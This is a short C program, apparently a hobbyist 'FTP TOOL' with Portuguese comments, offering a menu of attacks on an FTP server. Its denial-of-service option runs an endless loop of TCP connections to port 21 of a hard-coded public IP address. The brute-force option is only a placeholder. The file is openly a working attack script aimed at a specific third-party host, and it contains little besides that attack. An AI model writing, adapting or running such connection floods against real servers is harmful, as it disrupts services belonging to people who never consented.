#include <stdio.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <netdb.h>

//FTP-TOOL
//VERSION:1.0
//DATA:15/10/2019
//POR:RICARDO VM
//

int main() {

        int x;
        int meusocket;
        int conecta;


        printf("FTP TOOL DESEC\n");
        printf("OPTIONS: \n");
        printf("[1] Dos \n");
        printf("[2] Ataque De Forca Bruta \n");
        printf("[>] ");
        scanf("%i",&x);

        switch (x) {
                case 1:

                       printf("");
                       struct sockaddr_in alvo;
                       
                       for (;;){
                       meusocket = socket(AF_INET,SOCK_STREAM,0);
                       alvo.sin_family = AF_INET;
                       alvo.sin_port = htons(21);
                       alvo.sin_addr.s_addr = inet_addr("37.59.174.225"); //
                       
                       conecta = connect(meusocket, ( struct sockaddr *)&alvo, sizeof alvo);

                       if (conecta == 0) {
                            printf("Realizando DOS no Ftp (37.59.174.225) !!! \n");
                       } else{
                            printf("[!] Error :(  \n ");
                            close(meusocket);
                            close(conecta);

                       }

                       }

                       break;                       

                case 2:
                        printf("EM ANDAMENTO  \n");
                        break;

        }

        return 0;

}

        



    






                
                
                
                
                
        
        
        
        
        
        
                
                
        
        
                

